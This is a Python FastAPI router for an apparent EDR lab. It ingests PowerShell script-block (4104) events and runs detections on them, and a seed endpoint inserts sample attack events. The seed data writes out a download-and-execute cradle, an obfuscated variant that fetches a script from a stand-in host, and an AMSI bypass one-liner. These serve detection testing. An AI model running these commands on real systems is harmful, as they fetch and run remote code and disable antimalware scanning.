from datetime import datetime
from typing import List

from fastapi import APIRouter

from api.models.telemetry import PowerShell4104Event, PowerShellIngestResponse
from api.services.detection_engine import evaluate_universal_events
from api.services.universal_events import normalize_powershell_4104
from storage.powershell_4104 import insert_powershell_events


router = APIRouter(
    prefix="/api/telemetry/powershell",
    tags=["telemetry-powershell"],
)


@router.post("/", response_model=PowerShellIngestResponse)
def ingest_powershell_events(events: List[PowerShell4104Event]):
    count = insert_powershell_events(events)

    universal_events = [normalize_powershell_4104(event) for event in events]
    detections = evaluate_universal_events(universal_events)

    return PowerShellIngestResponse(
        ingested_count=count,
        detections_count=len(detections),
        detections=detections,
    )


@router.post("/seed", response_model=PowerShellIngestResponse)
def seed_high_fidelity_powershell_events():
    events = [
        PowerShell4104Event(
            timestamp=datetime.fromisoformat("2026-07-08T21:02:05"),
            hostname="WIN10-EDR-LAB01",
            actor_user="LAB\\desmond",
            subject_domain="LAB",
            process_id="6112",
            parent_process_id="5664",
            command_line="powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA",
            script_block_id="8f71f3c8-5f0d-47e1-b2d5-9b7aa9f2c211",
            runspace_id="0d5a6b1b-1b17-4a02-8a78-79c8c3f92e92",
            script_block_text="$wc = New-Object System.Net.WebClient; IEX $wc.DownloadString('https://raw.githubusercontent.com/acme-lab/bootstrap.ps1')",
            raw_payload={"channel": "Microsoft-Windows-PowerShell/Operational"},
        ),
        PowerShell4104Event(
            timestamp=datetime.fromisoformat("2026-07-08T21:02:09"),
            hostname="WIN10-EDR-LAB01",
            actor_user="LAB\\desmond",
            subject_domain="LAB",
            process_id="6112",
            parent_process_id="5664",
            command_line="powershell.exe -nop -w hidden -ep bypass",
            script_block_id="6e50fd75-53b3-43fd-90dd-186ca2e9aa22",
            runspace_id="0d5a6b1b-1b17-4a02-8a78-79c8c3f92e92",
            script_block_text="$a='Invo'+'ke-Expression'; $b='New-Object Net.WebClient'; &$a ((&([scriptblock]::Create($b))).DownloadString('https://update-checkin-service.com/a.ps1'))",
            raw_payload={"channel": "Microsoft-Windows-PowerShell/Operational"},
        ),
        PowerShell4104Event(
            timestamp=datetime.fromisoformat("2026-07-08T21:02:15"),
            hostname="WIN10-EDR-LAB01",
            actor_user="LAB\\desmond",
            subject_domain="LAB",
            process_id="6112",
            parent_process_id="5664",
            command_line="powershell.exe -ExecutionPolicy Bypass -NoProfile",
            script_block_id="0b4ffb61-9f6b-42a1-984c-a6f3dcbcd927",
            runspace_id="5b8a92f2-3944-446b-89ef-4520c3a349d1",
            script_block_text="[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
            raw_payload={"channel": "Microsoft-Windows-PowerShell/Operational"},
        ),
    ]

    count = insert_powershell_events(events)
    universal_events = [normalize_powershell_4104(event) for event in events]
    detections = evaluate_universal_events(universal_events)

    return PowerShellIngestResponse(
        ingested_count=count,
        detections_count=len(detections),
        detections=detections,
    )